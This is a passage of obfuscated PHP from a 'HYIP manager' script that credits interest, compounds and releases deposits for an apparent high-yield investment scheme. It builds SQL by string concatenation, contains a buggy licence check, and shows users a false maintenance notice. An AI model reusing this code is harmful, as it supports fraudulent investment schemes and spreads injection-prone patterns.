                  if (($elnlcnukTq[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]] == 0 OR $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] + $elnlcQRWek < $elnlcnukTq[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]]))
                  {
                    $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ('' . ',
                        amount = -' . $elnlcQRWek . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcQRWek . ',
                    		ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    		date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                                deposit_id = ') . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
                    (mysql_query ($q) OR print mysql_error ());
                    $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcQRWek . ',
                    		actual_amount = actual_amount + ' . $elnlcQRWek . '
                    		where id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
                    (mysql_query ($q) OR print mysql_error ());
                  }
                }
              }

              elnlccbtp ($elnlcTnMjL[$elnlcEuoJk['elnlciwGl']], $elnlcCEUNG, 'date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlchRExl . ' ' . $elnlcznNn . ' where id =' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      if ($elnlcJutIa[$elnlcEuoJk['elnlcBVhT']] == $elnlcEuoJk['elnlcziJV'])
      {
        $q = 'select * from hm2_types where q_days > 0 and pay_by_button != 1';
      }
      else
      {
        $q = 'select * from hm2_types where q_days > 0';
      }

      $elnlcbaLW = mysql_query ($q);
      while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
      {
        $elnlcGANTz = $elnlcTnMjL[$elnlcEuoJk['elnlcwNFK']] + $elnlcTnMjL[$elnlcEuoJk['elnlceDTDA']] - (0 < $elnlcTnMjL[delay] ? 1 : 0);
        $elnlcqaibS = $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
        if ($elnlcTnMjL[$elnlcEuoJk['elnlcMhIea']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlcqaibS . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcwlzeP . ' and 
                (deposit_date + interval ' . $elnlcGANTz . ' ' . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcGANTz . ' ') . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ('' . ' < now()) and
                ((' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' = 0) || (' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' && (deposit_date + interval ' . $elnlcTnMjL[$elnlcEuoJk['elnlchKil']] . ' ') . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlcpHCU = mysql_query ($q);
          while ($elnlcVOMs = mysql_fetch_array ($elnlcpHCU))
          {
            $elnlcwIHT = $elnlcVOMs[$elnlcEuoJk['elnlcGJRR']];
            $elnlcWIcKG = 'Deposit return';
            if ($elnlcTnMjL[$elnlcEuoJk['elnlcozQA']] != 0)
            {
              $elnlcwIHT = floor ($elnlcVOMs[$elnlcEuoJk['elnlcGJRR']] * (100 - $elnlcTnMjL[$elnlcEuoJk['elnlcozQA']])) / 100;
              $elnlcWIcKG = '' . 'Deposit return. ' . $elnlcTnMjL[$elnlcEuoJk['elnlcozQA']] . '% holded.';
            }

            $q = 'insert into hm2_history set
                user_id = ' . $elnlcVOMs[$elnlcEuoJk['elnlccuNQr']] . ',
      		amount = ' . $elnlcwIHT . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcwIHT . ',
                ec = ' . $elnlcVOMs[$elnlcEuoJk['elnlcFtnn']] . ',
      		date = \'' . $elnlcVOMs[$elnlcEuoJk['elnlcAQgnt']] . ('' . '\' + interval ' . $elnlcGANTz . ' ') . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlcVOMs[$elnlcEuoJk['elnlciwGl']] . ('' . ',
                description = \'' . $elnlcWIcKG . '\'');
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcwlzeP . ' and 
    	       (deposit_date + interval ' . $elnlcGANTz . ' ' . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcGANTz . ' ') . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ('' . ' < now()) and
             ((' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' = 0) || (' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' && (deposit_date + interval ' . $elnlcTnMjL[$elnlcEuoJk['elnlchKil']] . ' ') . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlcqaibS . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }

      flock ($elnlcDHasI, LOCK_UN);
      fclose ($elnlcDHasI);
      unlink ('' . './tmpl_c/lock_user' . $elnlcwlzeP);
    }

  }

  function elnlcplrs ($elnlcQjzjO)
  {
    global $elnlcEuoJk;
    global $elnlcJutIa;
    $elnlcVqFdz = array ();
    if (($elnlcJutIa[$elnlcEuoJk['elnlcoNrc']] == 1 AND $elnlcQjzjO != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
    while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
    {
      $elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlcpzHPR']]][$elnlcTnMjL[$elnlcEuoJk['elnlciwGl']]] = $elnlcTnMjL;
    }

    $elnlcDrDrs = $elnlcEuoJk['elnlcRMbnT'];
    $elnlcNzxN = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcQjzjO == -1)
    {
      $elnlcNzxN = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcQjzjO . ' and status = \'on\'';
    }

    if ($elnlcQjzjO == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcctGwF = mysql_query ($q) OR print mysql_error ());
    while ($elnlcxSCRb = mysql_fetch_array ($elnlcctGwF))
    {
      $elnlcwlzeP = $elnlcxSCRb[$elnlcEuoJk['elnlciwGl']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcwlzeP;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcDrDrs = $elnlcEuoJk['elnlcRMbnT'];
      while (0 < $elnlcDrDrs)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcwlzeP . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / (60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlcbaLW = mysql_query ($q) OR print mysql_error ());
        $elnlcDrDrs = $elnlcEuoJk['elnlcTMAG'];
        while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
        {
          ++$elnlcDrDrs;
          if (!isset ($elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]]))
          {
            continue;
          }

          $elnlcGGxPb = $elnlcEuoJk['elnlcTMAG'];
          $elnlcUIzCR = $elnlcEuoJk['elnlcTMAG'];
          reset ($elnlcVqFdz);
          reset ($elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]]);
          while (list ($elnlcjgHVx, $elnlcNdIze) = each ($elnlcVqFdz[$elnlcTnMjL[$elnlcEuoJk['elnlclJLHA']]]))
          {
            if (($elnlcNdIze[$elnlcEuoJk['elnlcQFob']] <= $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] AND ($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] <= $elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] OR $elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] == 0)))
            {
              $elnlcGGxPb = $elnlcNdIze[$elnlcEuoJk['elnlcicuKE']];
            }

            if (($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] < $elnlcNdIze[$elnlcEuoJk['elnlcQFob']] AND $elnlcGGxPb == 0))
            {
              $elnlcGGxPb = $elnlcUIzCR;
            }

            if (($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] < $elnlcNdIze[$elnlcEuoJk['elnlcQFob']] AND 0 < $elnlcGGxPb))
            {
              break;
            }

            $elnlcUIzCR = $elnlcNdIze[$elnlcEuoJk['elnlcicuKE']];
          }

          if (($elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] != 0 AND $elnlcNdIze[$elnlcEuoJk['elnlcAAKd']] < $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']]))
          {
            $elnlcGGxPb = $elnlcUIzCR;
          }

          $elnlcCEUNG = $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] * $elnlcGGxPb / 100;
          $elnlchRExl = '';
          if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlczBIx'])
          {
            $elnlchRExl = ' 1 day ';
          }
          else
          {
            if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'])
            {
              $elnlchRExl = ' 1 hour ';
            }
            else
            {
              if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcQWmx'])
              {
                $elnlchRExl = ' 7 day ';
              }
              else
              {
                if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == 'b-w')
                {
                  $elnlchRExl = ' 14 day ';
                }
                else
                {
                  if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlctKdcx'])
                  {
                    $elnlchRExl = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcWsvHa'])
                    {
                      $elnlchRExl = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcUEQok'])
                      {
                        $elnlchRExl = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcQTmA'])
                        {
                          $elnlchRExl = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcgGyV'])
                          {
                            $elnlchRExl = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlckgRG'])
                            {
                              $elnlchRExl = ' ' . $elnlcTnMjL[$elnlcEuoJk['elnlcwNFK']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcGGxPb == 0 AND $elnlchRExl == ''))
          {
            continue;
          }

          $elnlcWsTb = -1;
          $q = 'select weekday(\'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ') as dw');
          ($elnlciPGsk = mysql_query ($q) OR print mysql_error ());
          while ($elnlcGukIR = mysql_fetch_array ($elnlciPGsk))
          {
            $elnlcWsTb = $elnlcGukIR[$elnlcEuoJk['elnlcmhGF']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlcNscLk'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ') and ')) . ' deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
          ($elnlcvAkrE = mysql_query ($q) OR print mysql_error ());
          $elnlcLDnww = $elnlcEuoJk['elnlcTMAG'];
          while ($elnlceHtV = mysql_fetch_array ($elnlcvAkrE))
          {
            $elnlcLDnww = $elnlceHtV[$elnlcEuoJk['elnlcbiVt']];
          }

          if ($elnlcLDnww == 0)
          {
            if ((5 <= $elnlcWsTb AND $elnlcTnMjL[$elnlcEuoJk['elnlcWhGEq']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcWsTb == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                    ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ('' . ',
                    amount = ' . $elnlcCEUNG . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcJutIa[$elnlcEuoJk['elnlcoaQSz']] . number_format ($elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']], 2) . ('' . ' - ' . $elnlcGGxPb . ' %\',
                    actual_amount = ' . $elnlcCEUNG . ',
                    date = \'') . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                    ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
            }
          }

          (mysql_query ($q) OR print mysql_error ());
          $elnlcznNn = '';
          if ($elnlcTnMjL[$elnlcEuoJk['elnlciIhdT']] == $elnlcEuoJk['elnlckgRG'])
          {
            if (($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] == 0 OR ($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcgJuc']])))
            {
              $elnlcznNn = ', status = \'off\'';
            }

            if (($elnlcTnMjL[$elnlcEuoJk['elnlcMhIea']] == 1 AND ($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] == 0 OR ($elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcgJuc']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ',
                    amount = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] . ',
                    ec = ' . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                    deposit_id = ') . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcWsTb AND $elnlcTnMjL[$elnlcEuoJk['elnlcWhGEq']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] <= 100) AND $elnlcTnMjL[$elnlcEuoJk['elnlcgRBBC']] == 1))
              {
                if ($elnlcTnMjL[$elnlcEuoJk['elnlcuafl']] == 0)
                {
                  $elnlcTnMjL[$elnlcEuoJk['elnlcuafl']] = $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] + 1;
                }

                if (($elnlcTnMjL[$elnlcEuoJk['elnlcaWrN']] <= $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcGJRR']] <= $elnlcTnMjL[$elnlcEuoJk['elnlcuafl']]))
                {
                  if ($elnlcTnMjL[$elnlcEuoJk['elnlcVJgiM']] == 1)
                  {
                    $elnlcSJCUR = preg_split ('/\\s*,\\s*/', $elnlcTnMjL[$elnlcEuoJk['elnlcVAqsQ']]);
                    if (!in_array ($elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']], $elnlcSJCUR))
                    {
                      $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcSJCUR[0];
                    }
                  }
                  else
                  {
                    if ($elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] < $elnlcTnMjL[$elnlcEuoJk['elnlcJoei']])
                    {
                      $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcTnMjL[$elnlcEuoJk['elnlcJoei']];
                    }

                    if ($elnlcTnMjL[$elnlcEuoJk['elnlcvbav']] < $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']])
                    {
                      $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcTnMjL[$elnlcEuoJk['elnlcvbav']];
                    }
                  }
                }
                else
                {
                  $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] = $elnlcEuoJk['elnlcTMAG'];
                }

                if ((0 < $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] AND $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] <= 100))
                {
                  $elnlcQRWek = $elnlcCEUNG * $elnlcTnMjL[$elnlcEuoJk['elnlcIINzb']] / 100;
                  $elnlcCEUNG = floor ((floor ($elnlcCEUNG * 100000) / 100000 - floor ($elnlcQRWek * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlccuNQr']] . ('' . ',
                        amount = -' . $elnlcQRWek . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcQRWek . ',
                    		ec = ') . $elnlcTnMjL[$elnlcEuoJk['elnlcFtnn']] . ',
                    		date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl . ',
                                deposit_id = ') . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcQRWek . ',
                    		actual_amount = actual_amount + ' . $elnlcQRWek . '
                    		where id = ' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlccbtp ($elnlcTnMjL[$elnlcEuoJk['elnlciwGl']], $elnlcCEUNG, 'date = \'' . $elnlcTnMjL[$elnlcEuoJk['elnlckrmT']] . ('' . '\' + interval ' . $elnlchRExl));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlchRExl . ' ' . $elnlcznNn . ' where id =' . $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlcbaLW = mysql_query ($q);
      while ($elnlcTnMjL = mysql_fetch_array ($elnlcbaLW))
      {
        $elnlcGANTz = $elnlcTnMjL[$elnlcEuoJk['elnlcwNFK']] + $elnlcTnMjL[$elnlcEuoJk['elnlceDTDA']] - (0 < $elnlcTnMjL[$elnlcEuoJk['elnlceDTDA']] ? 1 : 0);
        $elnlcqaibS = $elnlcTnMjL[$elnlcEuoJk['elnlciwGl']];
        if ($elnlcTnMjL[$elnlcEuoJk['elnlcMhIea']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlcqaibS . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcwlzeP . ' and 
                (deposit_date + interval ' . $elnlcGANTz . ' day < last_pay_date or deposit_date + interval ' . $elnlcGANTz . ' day < now()) and
                ((' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' = 0) || (' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' && (deposit_date + interval ' . $elnlcTnMjL[$elnlcEuoJk['elnlchKil']] . ' day < now())))
             ';
          $elnlcpHCU = mysql_query ($q);
          while ($elnlcVOMs = mysql_fetch_array ($elnlcpHCU))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlcVOMs[$elnlcEuoJk['elnlccuNQr']] . ',
      		amount = ' . $elnlcVOMs[$elnlcEuoJk['elnlcGJRR']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcVOMs[$elnlcEuoJk['elnlcGJRR']] . ',
                      ec = ' . $elnlcVOMs[$elnlcEuoJk['elnlcFtnn']] . ',
      		date = \'' . $elnlcVOMs[$elnlcEuoJk['elnlcAQgnt']] . ('' . '\' + interval ' . $elnlcGANTz . ' day,
                      deposit_id = ') . $elnlcVOMs[$elnlcEuoJk['elnlciwGl']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcwlzeP . ' and 
    	       (deposit_date + interval ' . $elnlcGANTz . ' day < last_pay_date or deposit_date + interval ' . $elnlcGANTz . ' day < now()) and
             ((' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' = 0) || (' . $elnlcTnMjL[$elnlcEuoJk['elnlcPNKE']] . ' && (deposit_date + interval ' . $elnlcTnMjL[$elnlcEuoJk['elnlchKil']] . ' day < now()))) and
             type_id = ' . $elnlcqaibS . '
           ';
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlcdjrw ($a)
  {
    global $elnlcEuoJk;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    if (!file_exists ('settings.php'))
    {
      return array ();
    }

    $elnlcVaaPH = file ($elnlcEuoJk['elnlcoBFmM']);
    $t = chop ($elnlcVaaPH[1]);
    $elnlcqhoG = strlen ($t) / 2;
    for ($i = $elnlcEuoJk['elnlcTMAG']; $i < strlen ($t); $i += 2)
    {
      $d[$i / 2] = substr ($t, $i, 2);
      $d[$i / 2] = chr (hexdec ($d[$i / 2]) ^ 65);
    }

    $k = '';
    $elnlcgoCyD = elnlcaftul (0, $elnlcqhoG, $d);
    $j = $elnlcqhoG;
    while (10 < $j)
    {
      $elnlcgoCyD = elnlcaftul ($elnlcgoCyD, $elnlcqhoG, $d);
      $k .= $d[$elnlcgoCyD];
      $d[$elnlcgoCyD] = -1;
      --$j;
    }

    $z = chr (1) . chr (1) . chr (1);
    list ($k, $z) = split ('' . $z, $k, 2);
    list ($elnlcdBxmN, $elnlcRuMnj, $k) = split (':', $k, 3);
    if ($elnlcdBxmN != md5 ($k))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    if ($elnlcRuMnj = !md5 ($elnlcdBxmN . $elnlcRDaq))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    $z = unserialize ($k);
    $z[time_dif] = sprintf ('%d', $z[$elnlcEuoJk['elnlcEhrol']]);
    $elnlcCawm = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcEuoJk['elnlcIClH']);
    $z[$elnlcEuoJk['elnlcThKL']] = $elnlcCawm[$z[$elnlcEuoJk['elnlcOECbf']] - 1];
    if ($z[$elnlcEuoJk['elnlcDvrvD']] == 1)
    {
      $z[$elnlcEuoJk['elnlcPwfwL']] = sprintf ('%d', (time () - mktime (0, 0, 0, $z[$elnlcEuoJk['elnlcOECbf']], $z[$elnlcEuoJk['elnlcmRnOQ']], $z[$elnlcEuoJk['elnlccSzVf']])) / 86400);
    }

    $z[$elnlcEuoJk['elnlcCcLw']] = ($z[$elnlcEuoJk['elnlcEHKOv']] ? 1 : 0);
    $z[$elnlcEuoJk['elnlcTiwe']] = $z[$elnlcEuoJk['elnlcNOFp']];
    return $z;
  }

  function elnlcvwfu ()
  {
    global $elnlcEuoJk;
    $elnlccUKV = $elnlcEuoJk['elnlcTMAG'];
    if (file_exists ('./tmpl_c/.htdata'))
    {
      $elnlccUKV = $elnlcEuoJk['elnlcRMbnT'];
    }

    $s = array ();
    $elnlcVaaPH = fopen ($elnlcEuoJk['elnlciUWc'], $elnlcEuoJk['elnlcgLqW']);
    if ($elnlcVaaPH)
    {
      while ($elnlcxObM = fgets ($elnlcVaaPH, 20000))
      {
        $elnlcxObM = chop ($elnlcxObM);
        if (($elnlcxObM != '<?/*' AND $elnlcxObM != '*/?>'))
        {
          $elnlcRSiyq = $elnlcqMdD = '';
          list ($elnlcRSiyq, $elnlcqMdD) = @split ('	', $elnlcxObM, 2);
          if (((preg_match ('/^key|^cnf/', $elnlcRSiyq) AND $elnlccUKV == 1) OR $elnlccUKV == 0))
          {
            $s[$elnlcRSiyq] = $elnlcqMdD;
            continue;
          }

          continue;
        }
      }
    }

    fclose ($elnlcVaaPH);
    if ($elnlccUKV == 1)
    {
      list ($elnlcxObM, $elnlcDWur) = file ($elnlcEuoJk['elnlcskrq']);
      $elnlcSthCC = $elnlcxObM;
      $elnlcHnHc = $elnlcEuoJk['elnlcTMAG'];
      for ($i = $elnlcEuoJk['elnlcTMAG']; $i < strlen ($elnlcSthCC); $i += 5)
      {
        $elnlcHnHc += hexdec (substr ($elnlcSthCC, $i, 5));
      }

      if ($s[$elnlcEuoJk['elnlcodAMu']] != $elnlcHnHc * 15)
      {
        print '<!-- Settings are broken. Please e-mail to script developers as soon as possible -->';
        print 'System maintenance and hardware upgrades.';
        exit ();
      }

